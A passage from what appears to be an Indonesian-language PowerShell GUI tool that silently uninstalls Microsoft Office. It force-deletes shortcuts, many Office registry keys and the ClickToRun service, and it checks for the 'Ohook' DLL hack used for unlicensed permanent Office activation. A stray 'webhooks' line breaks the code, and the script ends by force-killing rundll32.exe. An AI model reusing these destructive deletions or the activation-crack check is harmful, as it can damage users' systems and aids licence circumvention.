                            Remove-Item -Path $shortcutFullPath -Force -ErrorAction Stop
                            Write-Host "Berhasil menghapus shortcut: $shortcutFullPath" -ForegroundColor Green
                        } Catch {
                            Write-Host "Gagal menghapus shortcut: $shortcutFullPath - $_" -ForegroundColor Yellow
                        }
                    }
                }
            }
            
            Write-Host "Menghapus shortcut yang dipin di Taskbar..." -ForegroundColor Cyan
            
            $taskbarPath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
            if (Test-Path $taskbarPath) {
                foreach ($shortcut in $shortcuts) {
                    $taskbarShortcut = "$taskbarPath\$shortcut"
                    if (Test-Path $taskbarShortcut) {
                        Try {
                            Remove-Item -Path $taskbarShortcut -Force -ErrorAction Stop
                            Write-Host "Berhasil menghapus pinned shortcut: $taskbarShortcut" -ForegroundColor Green
                        } Catch {
                            Write-Host "Gagal menghapus pinned shortcut: $taskbarShortcut - $_" -ForegroundColor Yellow
                        }
                    }
                }
            } else {
                Write-Host "Folder Taskbar shortcut tidak ditemukan. Lewati..." -ForegroundColor Gray
            }
            
            Write-Host "Proses penghapusan shortcut selesai!" -ForegroundColor Magenta
            
            
            # ==================================================================
            #  HAPUS REGISTRY OFFICE
            # ==================================================================
            $registryKeys = @(
                "HKEY_USERS\.DEFAULT\Software\Microsoft\Office",
                "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\Registration",
                "HKEY_CURRENT_USER\Software\Microsoft\Office\ClickToRun",
                "HKEY_CURRENT_USER\Software\Microsoft\Office",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\15.0",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\16.0",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRunStore",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onenote.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\outlook.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspub.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msaccess.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\infopath.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\groove.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lync.exe",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AppVISV",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lync16",
                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lync15"
            )

            # Loop untuk menghapus registry
            foreach ($key in $registryKeys) {
                $regPath = "Registry::$key"
                
                if (Test-Path $regPath) {
                    Try {
                        Remove-Item -Path $regPath -Recurse -Force -ErrorAction Stop
                        Write-Host "Berhasil menghapus: $key" -ForegroundColor Green
                    } Catch {
                        Write-Host "Gagal menghapus: $key - $_" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "Tidak ditemukan: $key" -ForegroundColor Gray
                }
            }


        }

        # Tentukan versi Office yang ditemukan
        $InstalledVersions = Get-InstalledOfficeVersion

        # Jika tidak ada Office yang terdeteksi
        if ($InstalledVersions.Count -eq 0) {
            Write-Host "Tidak ada Microsoft Office yang terdeteksi."
            exit 0
        }

        # Unduh setup jika diperlukan
        if ("2016-2024" -in $InstalledVersions) {
            Download-Setup -Url $UrlNew -Destination $SetupNew
        }
        if ("2013" -in $InstalledVersions) {
            Download-Setup -Url $UrlOld -Destination $SetupOld
        }

        # Konfigurasi file XML untuk uninstalasi
        $ConfigPathNew = "$env:TEMP\uninstall_office_new.xml"
        $ConfigPathOld = "$env:TEMP\uninstall_office_old.xml"

        @"
        <Configuration>
            <Remove All="TRUE"/>
            <RemoveMSI All="TRUE"/>
            <Display Level="None" AcceptEULA="TRUE"/>
        </Configuration>
"@ | Out-File -Encoding utf8 $ConfigPathNew

        @"
        <Configuration>
            <Remove All="TRUE"/>
            <RemoveMSI All="TRUE"/>
            <Display Level="None" AcceptEULA="TRUE"/>
        </Configuration>
"@ | Out-File -Encoding utf8 $ConfigPathOld

        Stop-OfficeProcess
        # Jalankan uninstall berdasarkan versi yang terdeteksi
        if ("2013" -in $InstalledVersions -and "2016-2024" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2013 dan 2016-2024. Akan menjalankan keduanya."
            Uninstall-Office -SetupPath $SetupNew -ConfigFile $ConfigPathNew
            Uninstall-Office -SetupPath $SetupOld -ConfigFile $ConfigPathOld
        } elseif ("2016-2024" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2016-2024. Menjalankan uninstall menggunakan setup baru."
            Uninstall-Office -SetupPath $SetupNew -ConfigFile $ConfigPathNew
        } elseif ("2013" -in $InstalledVersions) {
            Write-Host "Terdeteksi Office 2013. Menjalankan uninstall menggunakan setup lama."
            Uninstall-Office -SetupPath $SetupOld -ConfigFile $ConfigPathOld
        }

        # Hapus folder dan registry setelah uninstalasi
        Write-Host " Membersihkan folder dan registry Microsoft Office..."
        Stop-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
        Remove-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
        Remove-OfficeFoldersAndRegistry

        Write-Host "Proses uninstall selesai."

        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = 'Visible' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Content = 'SUBMIT' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Uninstall Completed" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $false })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.Value = '100' })

        # Cleanup
        Remove-Item $env:temp\ClickToRun -Recurse -Force
    }

    $UninstallOfficeScrub = {

        
    }

    $UninstallOfficeSARA = {

        
    }

    $buttonRemoveAll.Add_Click({

        Write-Host " Uninstalling Microsoft Office.."
        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOffice)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })
<#
    $buttonScrub.Add_Click({

        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOfficex)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })

    $buttonSARA.Add_Click({

        if ($radioButtonRemoveAllApp.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun -ItemType Directory -Force
            Set-Location $workingDir
            $sync.workingDir = $workingDir
            $sync.uninstall = $uninstall

            $PSIinstance = [powershell]::Create().AddScript($UninstallOfficeSARA)
            $PSIinstance.Runspace = $runspace
            $PSIinstance.BeginInvoke()
        }
    })
#>
$null = $Form.ShowDialog()

function CheckOhook {
    $ohook = 0
    $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")

    foreach ($version in 15, 16) {
        foreach ($path in $paths) {
            if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
                $ohook = 1
            }
        }
    }

    foreach ($systemFolder in "System", "SystemX86") {
        foreach ($officeFolder in "Office 15", "Office") {
            foreach ($path in $paths) {
                if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
                    $ohook = 1
                }
            }
        }
    }

    if ($ohook -eq 0) {
        return @"
        // Ohook Office Activation Status //
        Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.
"@
    }
    
    return @"
    // Ohook Office Activation Status //
    
    Ohook for permanent Office activation is installed.
"@
}
webhooks
# Tampilkan kembali
$WinAPI::ShowWindow($hwnd, 5) | Out-Null
Write-Host
Write-Host " PRESS " -NoNewLine
Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
Write-Host " TO EXIT:" -NoNewLine
read-host
# Membuka jendela CMD dan mengeksekusi perintah taskkill
Start-Process cmd.exe -ArgumentList '/c timeout /t 1 & taskkill /F /IM rundll32.exe /T'
